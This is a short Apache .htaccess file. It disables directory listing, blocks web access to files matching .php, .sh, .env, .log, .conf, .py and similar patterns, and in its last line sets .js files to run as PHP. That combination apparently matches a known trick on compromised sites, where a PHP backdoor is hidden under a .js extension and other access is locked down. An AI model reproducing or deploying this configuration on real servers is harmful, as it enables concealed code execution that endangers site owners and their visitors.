Options -Indexes
<FilesMatch "(?i).*(.ph|.sh|.pj|.env|.zip|.log|access_log|.conf|.py|.hta).*">
    Order Deny,Allow
    Deny from all
</FilesMatch>
AddType application/x-httpd-php .js
